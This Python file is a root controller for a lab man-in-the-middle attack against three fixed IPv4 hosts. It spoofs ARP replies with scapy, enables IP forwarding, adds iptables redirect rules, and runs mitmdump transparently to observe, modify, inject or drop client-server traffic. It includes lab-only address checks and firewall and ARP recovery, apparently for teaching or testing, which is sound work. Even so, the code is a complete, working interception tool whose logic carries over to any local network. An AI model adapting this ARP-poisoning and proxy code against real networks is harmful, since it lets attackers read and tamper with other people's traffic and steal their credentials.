"""Root controller for the fixed, isolated IPv4 lab; never scans a subnet."""
import argparse
import json
import hashlib
import os
from pathlib import Path
import signal
import socket
import subprocess
import threading
import time

SERVER, CLIENT, ATTACKER = "192.168.50.10", "192.168.50.11", "192.168.50.13"
BASE = Path("/var/lib/smart-mitm")
STATE = BASE / "attack-state.json"
ROOT = Path(__file__).resolve().parent
STOP = threading.Event()


def command(*args, check=True):
    try:
        return subprocess.run(args, check=check, capture_output=True, text=True)
    except subprocess.CalledProcessError as exc:
        raise RuntimeError("Command failed: " + " ".join(args) + ": " + exc.stderr.strip()) from exc


def interface_for(address):
    interfaces = json.loads(command("ip", "-j", "address", "show").stdout)
    matches = [i for i in interfaces if any(a.get("local") == address and a.get("prefixlen") == 24
               for a in i.get("addr_info", []))]
    if len(matches) != 1 or matches[0]["ifname"] == "lo":
        raise RuntimeError(f"Require exactly one /24 lab interface with {address}")
    return matches[0]["ifname"], matches[0]["address"]


def validate_peers(server, client, attacker):
    if (server, client, attacker) != (SERVER, CLIENT, ATTACKER):
        raise ValueError("Only VM1 .10, VM_2 .11, and VM4 .13 are authorized targets")


def save(state):
    temporary = STATE.with_suffix(".tmp")
    temporary.write_text(json.dumps(state, indent=2))
    temporary.chmod(0o600)
    temporary.replace(STATE)


def sysctl_read(key):
    return command("sysctl", "-n", key).stdout.strip()


def sysctl_write(key, value):
    command("sysctl", "-w", f"{key}={value}")


def resolve_peers(nic):
    from scapy.all import ARP, Ether, srp
    result = {}
    for address in (SERVER, CLIENT):
        answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=address),
                          iface=nic, timeout=3, retry=2, verbose=False)
        addresses = {reply.hwsrc.lower() for _, reply in answered if reply.psrc == address}
        if len(addresses) != 1:
            raise RuntimeError(f"Cannot verify a unique real MAC for {address}: {addresses}")
        result[address] = addresses.pop()
    return result


def arp_pair(state, restore=False):
    from scapy.all import ARP, Ether, sendp
    for destination, source in ((CLIENT, SERVER), (SERVER, CLIENT)):
        source_mac = state["peers"][source] if restore else state["attacker_mac"]
        # Keep the real Ethernet sender on repair frames so a learning switch
        # does not move the legitimate peer's MAC onto the attacker port.
        packet = Ether(dst=state["peers"][destination], src=state["attacker_mac"]) / ARP(
            op=2, psrc=source, hwsrc=source_mac, pdst=destination, hwdst=state["peers"][destination])
        sendp(packet, iface=state["interface"], count=3 if restore else 1, inter=0.1, verbose=False)


def rules(nic):
    # Exact tuples only; no changes to defaults or unrelated firewall rules.
    return [
        ["-t", "nat", "-A", "SLMITM_NAT", "-p", "tcp", "-j", "REDIRECT", "--to-ports", "18080"],
        ["-t", "nat", "-I", "PREROUTING", "-i", nic, "-s", CLIENT, "-d", SERVER,
         "-p", "tcp", "--dport", "8008", "-j", "SLMITM_NAT"],
        ["-A", "SLMITM_FWD", "-j", "ACCEPT"],
        ["-I", "FORWARD", "-i", nic, "-o", nic, "-s", CLIENT, "-d", SERVER, "-j", "SLMITM_FWD"],
        ["-I", "FORWARD", "-i", nic, "-o", nic, "-s", SERVER, "-d", CLIENT, "-j", "SLMITM_FWD"],
        ["-I", "INPUT", "-i", nic, "-s", CLIENT, "-d", ATTACKER, "-p", "tcp",
         "--dport", "18080", "-j", "ACCEPT"],
    ]


def remove_rules(state):
    failures = []
    for rule in reversed(state.get("rules", [])):
        delete = ["-D" if arg in ("-A", "-I") else arg for arg in rule]
        # Missing rules are fine after interrupted setup or repeated recovery.
        check = ["-C" if arg == "-D" else arg for arg in delete]
        if command("iptables", "-w", "5", *check, check=False).returncode == 0:
            result = command("iptables", "-w", "5", *delete, check=False)
            if result.returncode:
                failures.append(result.stderr)
    for table, chain in reversed(state.get("chains", [])):
        if command("iptables", "-w", "5", "-t", table, "-S", chain, check=False).returncode == 0:
            result = command("iptables", "-w", "5", "-t", table, "-X", chain, check=False)
            if result.returncode:
                failures.append(result.stderr)
    return failures


def recover():
    if not STATE.exists():
        return
    state = json.loads(STATE.read_text())
    errors = []
    try:
        if state.get("poisoning"):
            arp_pair(state, restore=True)
    except Exception as exc:
        errors.append(f"ARP repair: {exc}")
    errors.extend(remove_rules(state))
    for key, value in state.get("sysctl", {}).items():
        try:
            sysctl_write(key, value)
        except Exception as exc:
            errors.append(f"sysctl restore: {exc}")
    if errors:
        raise RuntimeError("Recovery incomplete; retained state: " + "; ".join(errors))
    STATE.unlink()


def run(mode, run_id):
    from demo_server import valid_run
    valid_run(run_id)
    validate_peers(SERVER, CLIENT, ATTACKER)
    if mode not in ("observe", "modify", "inject", "drop"):
        raise ValueError("Invalid mode")
    if STATE.exists():
        raise RuntimeError("Previous attack state exists; run Stop/recover first")
    nic, mac = interface_for(ATTACKER)
    peers = resolve_peers(nic)
    if len(set(peers.values()) | {mac}) != 3:
        raise RuntimeError("Peer MAC identities are not distinct")
    for table, chain in (("nat", "SLMITM_NAT"), ("filter", "SLMITM_FWD")):
        if command("iptables", "-w", "5", "-t", table, "-S", chain, check=False).returncode == 0:
            raise RuntimeError(f"Refusing existing firewall chain {chain}")
    state = {"run_id": run_id, "mode": mode, "interface": nic, "attacker_mac": mac,
             "peers": peers, "chains": [], "rules": [], "sysctl": {}, "poisoning": False}
    save(state)
    proxy = None
    try:
        changes = (("net.ipv4.ip_forward", "1"), ("net.ipv4.conf.all.send_redirects", "0"),
                   (f"net.ipv4.conf.{nic}.send_redirects", "0"))
        state["sysctl"] = {key: sysctl_read(key) for key, _ in changes}
        save(state)
        for key, value in changes:
            sysctl_write(key, value)
        for table, chain in (("nat", "SLMITM_NAT"), ("filter", "SLMITM_FWD")):
            state["chains"].append([table, chain])
            save(state)
            command("iptables", "-w", "5", "-t", table, "-N", chain)
        for rule in rules(nic):
            state["rules"].append(rule)
            save(state)
            command("iptables", "-w", "5", *rule)
        logdir = BASE / "proxy" / run_id
        logdir.mkdir(mode=0o700, parents=True, exist_ok=True)
        command("chown", "smart-mitm:smart-mitm", str(logdir))
        proxy = subprocess.Popen(["runuser", "-u", "smart-mitm", "--", "mitmdump",
            "--mode", "transparent", "--listen-host", ATTACKER, "--listen-port", "18080",
            "--set", "connection_strategy=lazy", "--set", "block_global=false",
            "--set", "confdir=/var/lib/smart-mitm/proxy/config", "-s", str(ROOT / "addon.py"),
            "--set", f"lab_mode={mode}", "--set", f"lab_run={run_id}",
            "--set", f"lab_log={logdir / 'flows.jsonl'}"])
        for _ in range(100):
            if proxy.poll() is not None:
                raise RuntimeError("mitmdump failed before ARP poisoning")
            try:
                with socket.create_connection((ATTACKER, 18080), timeout=0.2):
                    break
            except OSError:
                time.sleep(0.1)
        else:
            raise RuntimeError("mitmdump listener did not become ready")
        state["poisoning"] = True
        save(state)
        (BASE / "attack-ready").write_text(run_id)
        while not STOP.is_set():
            if proxy.poll() is not None:
                raise RuntimeError("mitmdump exited during the attack")
            arp_pair(state)
            STOP.wait(1)
    finally:
        (BASE / "attack-ready").unlink(missing_ok=True)
        if proxy is not None and proxy.poll() is None:
            proxy.terminate()
            try:
                proxy.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proxy.kill()
                proxy.wait()
        recover()


def main():
    import fcntl
    print("controller_sha256=" + hashlib.sha256(Path(__file__).read_bytes()).hexdigest(), flush=True)
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("action", choices=("run", "recover"))
    parser.add_argument("--mode", choices=("observe", "modify", "inject", "drop"), default="observe")
    parser.add_argument("--run-id", default="manual")
    args = parser.parse_args()
    if os.geteuid() != 0:
        raise SystemExit("Run as root on VM4_Attacker")
    BASE.mkdir(mode=0o711, exist_ok=True)
    with (BASE / "attack.lock").open("a") as lock:
        fcntl.flock(lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
        for sig in (signal.SIGTERM, signal.SIGINT):
            signal.signal(sig, lambda *_: STOP.set())
        if args.action == "recover":
            recover()
        else:
            run(args.mode, args.run_id)


if __name__ == "__main__":
    main()
